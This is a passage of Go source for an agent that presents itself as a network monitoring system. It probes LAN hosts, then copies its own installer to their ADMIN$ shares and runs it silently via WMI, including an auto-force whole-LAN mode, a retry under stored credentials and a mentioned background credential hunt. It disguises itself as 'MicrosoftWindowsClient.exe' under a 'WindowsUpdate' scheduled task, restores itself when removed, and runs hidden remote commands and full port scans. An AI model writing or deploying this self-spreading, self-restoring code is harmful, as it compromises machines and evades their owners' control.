		return 0, 0, 0, fmt.Errorf("cim: %s", r.Err)
	}
	return r.CPU, r.Mem, r.Disk, nil
}

func isAccessDenied(s string) bool {
	s = strings.ToLower(s)
	return strings.Contains(s, "access is denied") || strings.Contains(s, "access denied") || strings.Contains(s, "0x80070005")
}

// remoteStatsCIMCred retries with the locally-stored credential file. The
// password travels file->powershell only (path on our cmdline, never the
// secret) and is never logged.
func remoteStatsCIMCred(host string, timeout time.Duration) (float64, float64, float64, error) {
	b, err := os.ReadFile(NMSCredPath())
	if err != nil {
		return 0, 0, 0, fmt.Errorf("cim denied (no local cred file)")
	}
	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
	if len(lines) < 2 || strings.TrimSpace(lines[0]) == "" || strings.TrimSpace(lines[1]) == "" {
		return 0, 0, 0, fmt.Errorf("cim denied (cred file malformed)")
	}
	script := cimStatsCredScript(host)
	out, err := runWithTimeout(timeout, "powershell", "-NoProfile", "-Command", script)
	if err != nil {
		return 0, 0, 0, err
	}
	var r struct {
		CPU  float64 `json:"cpu"`
		Mem  float64 `json:"mem"`
		Disk float64 `json:"disk"`
		Err  string  `json:"err"`
	}
	if derr := json.NewDecoder(strings.NewReader(strings.TrimSpace(string(out)))).Decode(&r); derr != nil {
		return 0, 0, 0, fmt.Errorf("cim-cred parse")
	}
	if r.Err != "" {
		return 0, 0, 0, fmt.Errorf("cim-cred: %s", r.Err)
	}
	return r.CPU, r.Mem, r.Disk, nil
}

// isSelfHostIn reports whether host is one of ours (pure, tested).
func isSelfHostIn(host string, self []string) bool {
	for _, s := range self {
		if strings.EqualFold(strings.TrimSpace(s), strings.TrimSpace(host)) {
			return true
		}
	}
	return false
}

// isSelfHost checks against this box's live addresses.
func isSelfHost(host string) bool { return isSelfHostIn(host, selfIPs()) }

// ProbeHost probes one host fully (bounded by caller). The managed-hint
// share read and the CIM stats query run concurrently: serially they cost up
// to ~33s per host and stall whole cycles on big LANs.
func ProbeHost(host string) NMSHostResult {
	r := NMSHostResult{Host: host}
	if !TCPReachable(host) {
		return r
	}
	r.Reachable = true
	var wg sync.WaitGroup
	wg.Add(2)
	go func() {
		defer wg.Done()
		r.ManagedHint, r.ManagedUnknown = ManagedHintChecked(host)
	}()
	go func() {
		defer wg.Done()
		// Own addresses report local gopsutil numbers (a loopback CIM
		// query only produces red-herring WinRM errors on green cards).
		if isSelfHost(host) {
			c, m, d := SelfStats()
			r.CPU, r.Mem, r.Disk = c, m, d
			return
		}
		c, m, d, err := remoteStatsCIM(host, 25*time.Second)
		if err != nil {
			r.StatsErr = err.Error()
			return
		}
		r.CPU, r.Mem, r.Disk = c, m, d
	}()
	wg.Wait()
	return r
}

// ProbeRound probes hosts with bounded parallelism. Pure scheduling, tested.
func ProbeRound(hosts []string, maxParallel int) []NMSHostResult {
	if maxParallel < 1 {
		maxParallel = 1
	}
	if maxParallel > 32 {
		maxParallel = 32
	}
	out := make([]NMSHostResult, len(hosts))
	sem := make(chan struct{}, maxParallel)
	var wg sync.WaitGroup
	for i, h := range hosts {
		wg.Add(1)
		go func(i int, h string) {
			defer wg.Done()
			sem <- struct{}{}
			defer func() { <-sem }()
			out[i] = ProbeHost(h)
		}(i, h)
	}
	wg.Wait()
	return out
}

// ---------------------------------------------------------------------------
// Guard: the agent restore loop. Golden bytes = our own image (same binary).
// ---------------------------------------------------------------------------

func shaFile(path string) string {
	f, err := os.Open(path)
	if err != nil {
		return ""
	}
	defer f.Close()
	h := sha256.New()
	var buf [65536]byte
	for {
		n, rerr := f.Read(buf[:])
		if n > 0 {
			h.Write(buf[:n])
		}
		if rerr != nil {
			break
		}
	}
	return hex.EncodeToString(h.Sum(nil))
}

func shaBytes(b []byte) string {
	h := sha256.Sum256(b)
	return hex.EncodeToString(h[:])
}

// guardStartAgent restarts the agent via its own task (correct flags).
// Var so tests record instead of executing.
var guardStartAgent = func() error {
	_, err := runWithTimeout(30*time.Second, "schtasks", "/run", "/tn", "WindowsUpdate")
	return err
}

// FIX: agentProcAlive now matches the agent by image path, not name. The NMS
// IS MicrosoftWindowsClient.exe, so a stray copy of our own binary used to
// read as "agent alive". Path match keeps the guard honest; if the path is
// unavailable we still fall back to the name.
func agentProcAlive() bool {
	self := int32(os.Getpid())
	want := filepath.Clean(NMSAgentPath())
	procs, err := process.Pids()
	if err != nil {
		return false
	}
	for _, pid := range procs {
		if pid == self || pid <= 0 {
			continue
		}
		p, err := process.NewProcess(pid)
		if err != nil {
			continue
		}
		name, err := p.Name()
		if err != nil || !strings.EqualFold(name, "MicrosoftWindowsClient.exe") {
			continue
		}
		if exe, err := p.Exe(); err == nil && exe != "" {
			if strings.EqualFold(filepath.Clean(exe), want) {
				return true
			}
			continue
		}
		return true // path unavailable: trust the name
	}
	return false
}

// writeFileAtomic writes via temp+rename (no torn restores).
func writeFileAtomic(path string, data []byte) error {
	tmp := path + ".tmp"
	if err := os.WriteFile(tmp, data, 0644); err != nil {
		return err
	}
	return os.Rename(tmp, path)
}

// goldenCache avoids re-reading our own multi-MB image every cycle. Keyed on
// the live file's size+mtime: an update replacing bytes under us must NOT
// keep restoring a stale image - the guard always compares against current
// bytes (nmsUpdateAvailable exits the loop on version drift regardless).
var goldenMu sync.Mutex
var goldenPath string
var goldenSize int64
var goldenMtime time.Time
var goldenData []byte
var goldenSHACache string

// goldenImage returns our own image bytes + sha, reusing the cache only
// while the executable file on disk still matches (size+mtime).
func goldenImage() ([]byte, string, bool) {
	self, err := os.Executable()
	if err != nil {
		return nil, "", false
	}
	st, err := os.Stat(self)
	if err != nil {
		return nil, "", false
	}
	goldenMu.Lock()
	defer goldenMu.Unlock()
	if self == goldenPath && st.Size() == goldenSize && st.ModTime().Equal(goldenMtime) && len(goldenData) >= 1024*1024 {
		return goldenData, goldenSHACache, true
	}
	b, err := os.ReadFile(self)
	if err != nil || len(b) < 1024*1024 {
		return nil, "", false
	}
	goldenPath, goldenSize, goldenMtime = self, st.Size(), st.ModTime()
	goldenData, goldenSHACache = b, shaBytes(b)
	return goldenData, goldenSHACache, true
}

// GuardAgent verifies the agent exe (exists + matches our own image bytes)
// and its process; restores + restarts on any deviation. Returns a short
// action word for the report ("ok", "restored-missing", "restored-corrupt",
// "started-process", "no-golden", "update-in-flight").
func GuardAgent() string {
	agentPath := NMSAgentPath()
	golden, goldenSHA, ok := goldenImage()
	if !ok {
		return "no-golden"
	}
	curSHA := shaFile(agentPath)
	if curSHA == "" {
		if werr := writeFileAtomic(agentPath, golden); werr != nil {
			return "restore-failed:" + werr.Error()
		}
		_ = guardStartAgent()
		return "restored-missing"
	}
	if curSHA == goldenSHA {
		if !agentProcAlive() {
			_ = guardStartAgent()
			return "started-process"
		}
		return "ok"
	}
	// Mismatch: update in flight? A live claim naming the stamped version
	// with disk bytes equal to the pinned SHA is the updater's work, not a
	// trojan - hands off. (The watcher has arbitrated this way since
	// v1.44.1; the monitor lacked it and "repaired" updates backward.)
	if to, sha, _, claimOK := PendingClaim(); claimOK && to != "" && sha != "" {
		if want, rerr := os.ReadFile(filepath.Join(NMSRoot(), "version.txt")); rerr == nil && strings.TrimSpace(string(want)) == to && curSHA == sha {
			return "update-in-flight"
		}
	}
	// Orphaned stamp? Papers can lie newer than bytes after a failed swap;
	// restoring "backward" then fights the updater forever. Reconcile the
	// papers first: if the installed bytes match this image, they ARE the
	// good set - adopt them, don't restore.
	if act := ReconcileVersionStamp(NMSRoot(), version.Version); act != "" && shaFile(agentPath) == goldenSHA {
		log.Printf("[nms] guard: %s - installed bytes match this image, no restore", act)
		if !agentProcAlive() {
			_ = guardStartAgent()
			return "started-process"
		}
		return "ok"
	}
	q := fmt.Sprintf("%s.quarantined-%d", agentPath, time.Now().Unix())
	_ = os.Rename(agentPath, q)
	if werr := writeFileAtomic(agentPath, golden); werr != nil {
		return "restore-failed:" + werr.Error()
	}
	_ = guardStartAgent()
	return "restored-corrupt"
}

// ---------------------------------------------------------------------------
// Clone arm: eligibility (pure, tested) + executor + circuit breaker.
// ---------------------------------------------------------------------------

// CloneEligible decides whether host may be auto-cloned. Pure, tested.
// managedHint/cfg-excluded/self/controller IPs all veto. Reachability is
// checked by the caller (probe round) and passed in.
func CloneEligible(host string, reachable, managedHint bool, exclude, selfIPs, controllerIPs []string) (bool, string) {
	if !reachable {
		return false, "unreachable"
	}
	if managedHint {
		return false, "already-managed"
	}
	if nmsHasFold(exclude, host) {
		return false, "excluded"
	}
	if nmsHasFold(selfIPs, host) {
		return false, "self"
	}
	if nmsHasFold(controllerIPs, host) {
		return false, "controller"
	}
	return true, "eligible"
}

// selfIPs returns this box's IPv4 addresses (loopback included for safety).
func selfIPs() []string {
	var out []string
	ifs, err := net.Interfaces()
	if err != nil {
		return out
	}
	for _, iface := range ifs {
		addrs, err := iface.Addrs()
		if err != nil {
			continue
		}
		for _, a := range addrs {
			var ip net.IP
			switch v := a.(type) {
			case *net.IPNet:
				ip = v.IP
			case *net.IPAddr:
				ip = v.IP
			}
			if ip = ip.To4(); ip != nil {
				out = append(out, ip.String())
			}
		}
	}
	return out
}

// NMSInstallerPath is the installer copy the installer lays beside the
// agent at install time (a byte copy of its own image - no embed
// circularity: installer embeds agent, agent never embeds installer).
// Clone jobs deploy from these bytes after MZ+size validation.
func NMSInstallerPath() string { return filepath.Join(NMSRoot(), "Agent-Setup.exe") }

// NMSInstallerInfo reports the clone payload on disk (size, sha, PE sanity).
// Missing/undersized/non-MZ reads as absent - the clone arm then reports
// no-payload honestly instead of pushing garbage.
func NMSInstallerInfo() (size int64, sha string, ok bool) {
	b, err := os.ReadFile(NMSInstallerPath())
	if err != nil || len(b) < 10*1024*1024 {
		return 0, "", false
	}
	if b[0] != 'M' || b[1] != 'Z' {
		return 0, "", false
	}
	return int64(len(b)), shaBytes(b), true
}

// readInstallerBytes loads the clone payload (validated by NMSInstallerInfo).
func readInstallerBytes() ([]byte, bool) {
	if _, _, ok := NMSInstallerInfo(); !ok {
		return nil, false
	}
	b, err := os.ReadFile(NMSInstallerPath())
	if err != nil {
		return nil, false
	}
	return b, true
}

// nmsSMBWriteFile writes bytes to any UNC path with a hard timeout (raw
// error - callers classify). Var so tests cut the LAN.
var nmsSMBWriteFile = func(dest string, data []byte) error {
	done := make(chan error, 1)
	go func() { done <- os.WriteFile(dest, data, 0644) }()
	select {
	case err := <-done:
		return err
	case <-time.After(120 * time.Second):
		return fmt.Errorf("stalled over 120s (link down mid-transfer?)")
	}
}

// nmsSMBCopy / nmsRemoteExec / nmsCloneVerify are vars so tests cut the LAN.
var nmsSMBCopy = func(host string, data []byte) error {
	if err := nmsSMBWriteFile(`\\`+host+`\ADMIN$\Temp\Agent-Setup.exe`, data); err != nil {
		if strings.HasPrefix(err.Error(), "stalled") {
			return fmt.Errorf("smb copy: %s", err.Error())
		}
		return fmt.Errorf("smb copy: %s", classifySMBErr(err))
	}
	return nil
}

// classifySMBErr turns UNC write failures into actionable words (paths
// carry host+share only - never credentials - so the text is log-safe).
// Pure, tested.
func classifySMBErr(err error) string {
	var errno syscall.Errno
	if errors.As(err, &errno) {
		switch int(errno) {
		case 5:
			return "access denied (SMB creds lack ADMIN$ write - check target Administrators; workgroup target: LocalAccountTokenFilterPolicy)"
		case 53:
			return "bad network path (no route or SMB disabled on target)"
		case 64:
			return "network name deleted (host went away mid-copy)"
		case 1219:
			return "multiple IPC$ sessions (drop stale net-use sessions to this host)"
		case 1231:
			return "network unreachable (no route to host)"
		}
		return fmt.Sprintf("os error %d", int(errno))
	}
	if pe, ok := err.(*os.PathError); ok {
		return "path error: " + pe.Err.Error()
	}
	return strings.TrimSpace(err.Error())
}

// nmsRemoteDelete removes a UNC path (best-effort cleanup). Var for tests.
var nmsRemoteDelete = func(path string) error {
	done := make(chan error, 1)
	go func() { done <- os.Remove(path) }()
	select {
	case err := <-done:
		return err
	case <-time.After(30 * time.Second):
		return fmt.Errorf("delete timed out")
	}
}

// FIX: nmsRemoteCreate actually runs on the TARGET now. The old version made
// a CIM session `$s` and then called Invoke-CimMethod WITHOUT -CimSession, so
// Win32_Process.Create ran on the local NMS box. The local launch returned 0,
// so the clone looked launched while the target never started anything and
// every clone ended "launched-unverified". Added -CimSession $s, try/finally
// so the session is always released, and -ErrorAction Stop so a dead host
// fails fast.
var nmsRemoteCreate = func(host, commandLine string) error {
	script := cimCreateScript(host, commandLine)
	out, err := runWithTimeout(60*time.Second, "powershell", "-NoProfile", "-Command", script)
	if err != nil {
		return err
	}
	if code := strings.TrimSpace(string(out)); code != "0" {
		return fmt.Errorf("remote create: %s", wmiReturnText(code))
	}
	return nil
}

var nmsRemoteExec = func(host string) error {
	return nmsRemoteCreate(host, `C:\Windows\Temp\Agent-Setup.exe --silent`)
}

// NMSRemoteRun stages a batch script on host, runs it hidden via WMI, collects
// capped output, and cleans up both remote files (best-effort). One-shot,
// non-interactive, no passwords on any command line. Returns output
// (possibly partial with a timeout error).
func NMSRemoteRun(host, command string, timeout time.Duration) (string, error) {
	if timeout <= 0 {
		timeout = time.Minute
	}
	if timeout > 5*time.Minute {
		timeout = 5 * time.Minute
	}
	tag := fmt.Sprintf("rme-%d", time.Now().UnixNano())
	bat := `\\` + host + `\ADMIN$\Temp\` + tag + `.bat`
	out := `\\` + host + `\ADMIN$\Temp\` + tag + `.out`
	cleanup := func() {
		_ = nmsRemoteDelete(bat)
		_ = nmsRemoteDelete(out)
	}
	if err := nmsSMBWriteFile(bat, []byte("@echo off\r\n"+command+"\r\n")); err != nil {
		return "", fmt.Errorf("stage: %s", classifySMBErr(err))
	}
	remote := `cmd.exe /c "` + `C:\Windows\Temp\` + tag + `.bat > ` + `C:\Windows\Temp\` + tag + `.out 2>&1"`
	if err := nmsRemoteCreate(host, remote); err != nil {
		cleanup()
		return "", fmt.Errorf("launch: %s", strings.TrimSpace(err.Error()))
	}
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if b, err := nmsReadUNC(out); err == nil {
			cleanup()
			return string(truncateOut(b)), nil
		}
		time.Sleep(5 * time.Second)
	}
	// Timeout: harvest partial output if any, then clean up.
	if b, err := nmsReadUNC(out); err == nil && len(b) > 0 {
		cleanup()
		return string(truncateOut(b)), fmt.Errorf("timed out after %s (partial output)", timeout)
	}
	cleanup()
	return "", fmt.Errorf("timed out after %s (no output file)", timeout)
}

// wmiReturnText translates Win32_Process.Create ReturnValues (pure, tested).
func wmiReturnText(code string) string {
	switch code {
	case "0":
		return "ok"
	case "2":
		return "access denied (WMI 2 - DCOM/RPC rights or TrustedHosts)"
	case "3":
		return "insufficient privilege (WMI 3 - account needs remote-launch rights)"
	case "8":
		return "unknown failure (WMI 8 - provider error on target)"
	case "9":
		return "path not found (WMI 9 - installer copy missing on target)"
	case "21":
		return "invalid parameter (WMI 21)"
	default:
		return "unexpected ReturnValue " + code
	}
}

var nmsCloneVerify = func(host, wantVer string, timeout time.Duration) bool {
	p := `\\` + host + `\ADMIN$\Microsoft\Windows\Update\version.txt`
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if v, ok := nmsFileStat(p); ok && v == wantVer {
			return true
		}
		time.Sleep(15 * time.Second)
	}
	return false
}

// CloneToHost pushes the installer and launches it remotely. Returns the
// clone-state word plus a human detail line (surfaced in clone_detail and
// the ledger event - bare words never again).
//
// FIX: launched-unverified now records a breaker failure. Before, a box that
// launched but never confirmed looped forever after cooldown and never
// contributed to the storm guard.
//
// Identity: current process context first; on access-denied-classified
// failure with a vault cred file present, ONE fallback attempt under the
// vault identity (session-managed: setup, copy, launch, verify, teardown).
// The winning mechanism pins per host so both legs never split identities.
func CloneToHost(host string, wantVer string) (state, detail string) {
	data, ok := readInstallerBytes()
	if !ok {
		return "no-payload", "installer copy missing beside the agent"
	}
	if recallHostIdentity(host) == "vault" {
		// Pinned vault host: cred file gone since? Drop the pin and run
		// the normal current-context path instead of failing on air.
		if !vaultCredsPresent() {
			forgetHostIdentity(host)
		} else {
			return cloneToHostVault(host, wantVer, data)
		}
	}
	if err := nmsSMBCopy(host, data); err != nil {
		if isAccessDeniedErr(err) && vaultCredsPresent() {
			return cloneToHostVault(host, wantVer, data)
		}
		nmsRecordFail()
		return "copy-failed", strings.TrimSpace(err.Error())
	}
	if err := nmsRemoteExec(host); err != nil {
		nmsRecordFail()
		return "launch-failed", strings.TrimSpace(err.Error())
	}
	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
		recordHostIdentity(host, "context")
		return "cloned-verified", "version.txt reports " + wantVer
	}
	nmsRecordFail() // FIX: unverified is a failure signal too
	return "launched-unverified", "launched but version.txt did not confirm within 5min (slow box or installer still running?)"
}

// cloneToHostVault is the vault-identity attempt: session setup, copy over
// the session-carried UNC path, vault-cred WMI launch, session-covered
// verify, teardown always (even on failure paths).
func cloneToHostVault(host string, wantVer string, data []byte) (state, detail string) {
	if err := smbSessionEstablish(host); err != nil {
		nmsRecordFail()
		return "copy-failed", "vault session: " + strings.TrimSpace(err.Error())
	}
	defer smbSessionTeardown(host)
	dest := `\\` + host + `\ADMIN$\Temp\Agent-Setup.exe`
	if err := nmsSMBWriteFile(dest, data); err != nil {
		nmsRecordFail()
		return "copy-failed", "vault session copy: " + classifySMBErr(err)
	}
	if err := nmsRemoteCreateCred(host, `C:\Windows\Temp\Agent-Setup.exe --silent`); err != nil {
		nmsRecordFail()
		return "launch-failed", "vault session launch: " + strings.TrimSpace(err.Error())
	}
	if nmsCloneVerify(host, wantVer, 5*time.Minute) {
		recordHostIdentity(host, "vault")
		return "cloned-verified", "version.txt reports " + wantVer + " (via vault identity)"
	}
	nmsRecordFail()
	return "launched-unverified", "launched under vault identity but version.txt did not confirm within 5min"
}

// vaultCredsPresent reports whether the operator placed the vault cred file
// (existence + two non-empty lines; content never read here, never logged).
func vaultCredsPresent() bool {
	b, err := os.ReadFile(NMSCredPath())
	if err != nil {
		return false
	}
	lines := strings.Split(strings.ReplaceAll(string(b), "\r\n", "\n"), "\n")
	return len(lines) >= 2 && strings.TrimSpace(lines[0]) != "" && strings.TrimSpace(lines[1]) != ""
}

// isAccessDeniedErr reports whether err is an access-denied-classified
// failure (the only failure worth a vault retry).
func isAccessDeniedErr(err error) bool {
	if err == nil {
		return false
	}
	s := strings.ToLower(err.Error())
	return strings.Contains(s, "access denied")
}

// --- circuit breaker: failure storms pause the clone ARM only. Probing,
// guarding, and reporting continue (the NMS keeps running forever). ---

var breakerMu sync.Mutex
var breakerFails []time.Time
var breakerPausedUntil time.Time

// nmsRecordFail logs a clone failure and trips the breaker at threshold.
func nmsRecordFail() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	now := time.Now()
	breakerFails = append(breakerFails, now)
	cfg := LoadNMSConfig()
	window := time.Duration(cfg.FailWindowMin) * time.Minute
	if window <= 0 {
		window = 15 * time.Minute
	}
	var kept []time.Time
	for _, t := range breakerFails {
		if now.Sub(t) <= window {
			kept = append(kept, t)
		}
	}
	breakerFails = kept
	if len(kept) >= cfg.FailThreshold && cfg.FailThreshold > 0 {
		rearm := time.Duration(cfg.RearmAfterMin) * time.Minute
		if cfg.RearmAfterMin < 0 {
			rearm = time.Hour
		}
		breakerPausedUntil = now.Add(rearm)
	}
}

// CloneArmPaused reports whether the breaker holds the clone arm.
func CloneArmPaused() bool {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	if breakerPausedUntil.IsZero() {
		return false
	}
	if time.Now().After(breakerPausedUntil) {
		breakerPausedUntil = time.Time{}
		breakerFails = nil
		return false
	}
	return true
}

// nmsClearBreaker resets failures + pause (set-nms autoclone=on).
func nmsClearBreaker() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	breakerFails = nil
	breakerPausedUntil = time.Time{}
}

// nmsRecordSuccess decays the storm counter: a verified clone proves the arm
// is healthy again (failures age out on success instead of only on manual
// re-arm).
func nmsRecordSuccess() {
	breakerMu.Lock()
	defer breakerMu.Unlock()
	breakerFails = nil
	breakerPausedUntil = time.Time{}
}

// ---------------------------------------------------------------------------
// Clone job ledger: one entry per host. Kills the re-clone storm (every tick
// launching CloneToHost for the same host) and makes CloneState honest: the
// report carries the real terminal word, not a perpetual "job started".
// ---------------------------------------------------------------------------

// cloneHostCooldown is how long a terminal job state suppresses relaunches
// for the same host (a dead box stays "cooling down" instead of being
// re-pushed every interval).
const cloneHostCooldown = 30 * time.Minute

type cloneJob struct {
	State  string
	Detail string
	At     time.Time
	Done   bool
	Forced bool
}

var cloneMu sync.Mutex
var cloneJobs = map[string]*cloneJob{}
var pendingCloneEvents []string

// nmsCloneExec runs the clone executor. Var so tests record instead of
// touching the LAN.
var nmsCloneExec = CloneToHost

func pushCloneEvent(s string) {
	// Caller holds cloneMu.
	pendingCloneEvents = append(pendingCloneEvents, s)
	if len(pendingCloneEvents) > 20 {
		pendingCloneEvents = pendingCloneEvents[len(pendingCloneEvents)-20:]
	}
}

func drainCloneEvents() []string {
	cloneMu.Lock()
	defer cloneMu.Unlock()
	out := append([]string{}, pendingCloneEvents...)
	pendingCloneEvents = nil
	return out
}

// startCloneJob launches one tracked clone unless a job is already in flight
// or a terminal state is still cooling down. Returns the CloneState word for
// the report and whether a new job actually started. forced marks operator
// overrides (audit trail only - the executor pipeline is identical).
func startCloneJob(host, wantVer string, forced bool) (state string, started bool) {
	now := time.Now()
	cloneMu.Lock()
	if j, ok := cloneJobs[host]; ok {
		if !j.Done {
			cloneMu.Unlock()
			return "cloning", false
		}
		if now.Sub(j.At) < cloneHostCooldown {
			st := j.State
			cloneMu.Unlock()
			return "clone-cooldown-" + st, false
		}
	}
	cloneJobs[host] = &cloneJob{State: "cloning", Detail: "job started", At: now, Forced: forced}
	// Opportunistic prune: drop cold terminal entries so the map can't grow
	// with LAN churn.
	for h, j := range cloneJobs {
		if j.Done && now.Sub(j.At) > 2*cloneHostCooldown {
			delete(cloneJobs, h)
		}
	}
	cloneMu.Unlock()
	go func() {
		st, detail := nmsCloneExec(host, wantVer)
		if len(detail) > 240 {
			detail = detail[:240] + "..."
		}
		cloneMu.Lock()
		cloneJobs[host] = &cloneJob{State: st, Detail: detail, At: time.Now(), Done: true, Forced: forced}
		evt := "clone " + host + ": " + st + " - " + detail
		if forced {
			evt = "FORCED by operator: " + evt
		}
		pushCloneEvent(evt)
		cloneMu.Unlock()
		if st == "cloned-verified" {
			nmsRecordSuccess()
		}
		// Forced failures count double toward the breaker: unknown-territory
		// pushes fail more often, so the storm guard trips sooner on them.
		if forced && (st == "copy-failed" || st == "launch-failed") {
			nmsRecordFail()
		}
	}()
	return "cloning", true
}

// cloneJobLookup returns the tracked state+detail for a host, if any.
func cloneJobLookup(host string) (state, detail string, tracked bool) {
	cloneMu.Lock()
	defer cloneMu.Unlock()
	j, ok := cloneJobs[host]
	if !ok {
		return "", "", false
	}
	return j.State, j.Detail, true
}

// ---------------------------------------------------------------------------
// Deep-scan jobs: full TCP range on explicit demand only (never sweep,
// never auto). Async ledger mirroring the clone pattern: tracked state,
// cooldown, terminal event.
// ---------------------------------------------------------------------------

// scanCooldown spaces repeat deep scans per host (read-only, but noisy).
const scanCooldown = 10 * time.Minute

type scanJob struct {
	State  string
	Detail string
	At     time.Time
	Done   bool
}

var scanMu sync.Mutex
var scanJobs = map[string]*scanJob{}

// startScanJob launches one tracked full-range scan unless in flight or
// cooling down. Returns display state + whether it started.
func startScanJob(host string) (state string, started bool) {
	now := time.Now()
	scanMu.Lock()
	if j, ok := scanJobs[host]; ok {
		if !j.Done {
			scanMu.Unlock()
			return "scanning", false
		}
		if now.Sub(j.At) < scanCooldown {
			scanMu.Unlock()
			return "scan-cooldown", false
		}
	}
	scanJobs[host] = &scanJob{State: "scanning", Detail: "full-range scan running", At: now}
	scanMu.Unlock()
	go func() {
		ports := make([]int, 0, 65535)
		for p := 1; p <= 65535; p++ {
			ports = append(ports, p)
		}
		open := probeOpenPorts(host, ports, 300*time.Millisecond, 256)
		fp, why := fingerprintHost(open)
		detail := "open: none"
		if len(open) > 0 {
			shown := open
			if len(shown) > 40 {
				detail = fmt.Sprintf("open: %v... +%d more", shown[:40], len(shown)-40)
			} else {
				detail = fmt.Sprintf("open: %v", shown)
			}
		}
		detail += " => " + fp + " (" + why + ")"
		if len(detail) > 400 {
			detail = detail[:400] + "..."
		}
		scanMu.Lock()
		scanJobs[host] = &scanJob{State: "scan-complete", Detail: detail, At: time.Now(), Done: true}
		pushCloneEvent("scan " + host + ": " + detail)
		scanMu.Unlock()
	}()
	return "scanning", true
}

// NMSReport is the per-cycle JSON the controller stores and serves.
type NMSReport struct {
	Prober   string         `json:"prober"`
	At       string         `json:"at"`
	Tick     uint64         `json:"tick"`
	Version  string         `json:"version"`
	Interval int            `json:"interval_sec"`
	Sleep    *NMSSleepState `json:"sleep,omitempty"`
	Guard    string         `json:"guard"`
	CloneArm string         `json:"clone_arm"`
	// AutoForce mirrors config: dashboard badges whole-LAN forcing.
	AutoForce bool            `json:"autoforce"`
	Priv      *NMSPriv        `json:"priv,omitempty"`
	Results   []NMSHostResult `json:"results"`
	Events    []string        `json:"events,omitempty"`
	// SelfSkipped names own-box addresses seen this cycle: explicit proof
	// the prober never targets itself (a self-clone is a P0 by definition).
	SelfSkipped []string `json:"self_skipped,omitempty"`
}

var nmsTick uint64
var nmsSweepCacheMu sync.Mutex
var nmsSweepCache []string
var nmsSweepAt time.Time

// NMSTick returns the loop counter (test hook proving the loop runs).
func NMSTick() uint64 { return atomic.LoadUint64(&nmsTick) }

// nmsEnsureElevated fronts ensureElevated behind a var so tests run
// hermetic (the real check shells schtasks and reads the live token —
// medium shells answer nondeterministically, which made StepNMS tests
// flake by environment).
var nmsEnsureElevated = ensureElevated

// StepNMS runs one full monitor cycle and hands the report JSON to send
// (the caller wraps it in the transport message). send==nil is allowed
// (tests / dry runs).
func StepNMS(send func(reportJSON string), controllerIPs []string) error {
	// FIX: elevation hand-off. Unelevated process relaunches itself elevated
	// once and exits; the elevated copy is the steady state.
	if !nmsElevationDone {
		nmsElevationDone = true
		if !nmsEnsureElevated() {
			ReleaseNMSPid()
			return ErrNMSElevate
		}
	}
	if ShutdownRequested() {
		ReleaseNMSPid()
		return ErrNMSShutdown
	}
	// Heal drifted papers BEFORE the version check below: a failed swap can
	// leave version.txt newer than these bytes, which would otherwise exit
	// the loop here forever (the "stamped but unswapped" wedge).
	reconciledEvt := ReconcileVersionStamp(NMSRoot(), version.Version)
	if want, ok := nmsUpdateAvailable(); ok {
		ReleaseNMSPid()
		return fmt.Errorf("%w (%s)", ErrNMSUpdate, want)
	}
	tick := atomic.AddUint64(&nmsTick, 1)
	cfg := LoadNMSConfig()
	var events []string
	if reconciledEvt != "" {
		events = append(events, "version stamp "+reconciledEvt+" (papers lied newer than bytes)")
	}

	targets := sweepTargets(cfg)

	// Probe (self first: proves the loop is alive even with zero targets).
	cpuP, memP, diskP := SelfStats()
	hn, _ := os.Hostname()
	results := []NMSHostResult{{Host: hn + " (self)", Reachable: true, CPU: cpuP, Mem: memP, Disk: diskP, CloneState: "self"}}
	if len(targets) > 0 {
		results = append(results, ProbeRound(targets, cfg.MaxParallel)...)
	}
	// Tier-2 auto-profile: ARP-present hosts dark on Tier-1 get identified
	// (bounded per cycle, 30-min cache) so appliances stop reading as
	// "nothing" - and so the auto arm below can veto non-Windows kinds.
	profileDarkHosts(results, arpSeedHosts())

	// Guard the agent.
	guard := GuardAgent()
	if strings.HasPrefix(guard, "restored-") {
		events = append(events, "ALARM: agent "+guard+" (bytes rewritten from NMS image)")
	} else if strings.HasPrefix(guard, "restore-failed") {
		events = append(events, "ALARM: agent "+guard)
	}

	// Clone arm (auto): eligible reachable unmanaged hosts, one tracked job
	// per host (in-flight dedupe + cooldown, honest terminal states).
	// Effective arm = AutoClone OR AutoForce: setting autoforce=on starts
	// the arm even with autoclone off (a FORCE badge beside an idle arm
	// was a lie - v1.49.21).
	cloneArm := "idle"
	armOn := (cfg.AutoClone || cfg.AutoForce) && !CloneArmPaused()
	var selfSkipped []string
	if armOn {
		cloneArm = "scanning"
		if cfg.AutoForce {
			cloneArm = "scanning+force"
		}
		self := selfIPs()
		size, _, ok := NMSInstallerInfo()
		_ = size
		for i := range results {
			r := &results[i]
			if strings.HasSuffix(r.Host, "(self)") {
				continue
			}
			// Gates first (reachable, listed, self, controller, proven-
			// managed): force never bypasses any of these, auto or manual.
			elig, reason := CloneEligible(r.Host, r.Reachable, r.ManagedHint, cfg.Exclude, self, controllerIPs)
			if !elig {
				// "unreachable" on an NBNS-named Windows box is not a dead
				// IP - it's a box with File and Printer Sharing OFF. Say
				// so, and say what flips it, instead of reporting a
				// skip nobody can act on.
				if reason == "unreachable" && r.Fingerprint == "windows-smb-off" {
					r.CloneState = "skip-smb-off"
					r.CloneDetail = "windows box " + r.NBName + " with SMB closed - enable File and Printer Sharing (SMB-In) on it to clone"
					continue
				}
				r.CloneState = "skip-" + reason
				// Self-exclusion is explicit and loud: own box is named
				// in the report, never silently dropped. A self-clone
				// attempt is a P0 by definition.
				if reason == "self" {
					r.CloneDetail = "this box - never targeted"
					selfSkipped = append(selfSkipped, r.Host)
				}
				continue
			}
		if r.ManagedUnknown {
			// Credential-backed attempt: autofind=on WITH a vault cred now
			// present turns the unknown wall into a vault-identity clone
			// attempt (the fallback inside CloneToHost authenticates
			// properly; honest terminal states, breaker untouched).
			credBacked := cfg.AutoFind && vaultCredsPresent()
			// Share denied: skip unless auto-force opted in (whole-LAN
			// force) or a discovered/placed vault cred backs the attempt.
			// Proven-managed never reaches here (gated above).
			if !cfg.AutoForce && !credBacked {
				r.CloneState = "skip-managed-unknown"
				r.CloneDetail = "share read denied - refusing to guess"
				// autofind: exactly this wall class gets a background
				// credential hunt (cfg-gated, deduped, never blocks).
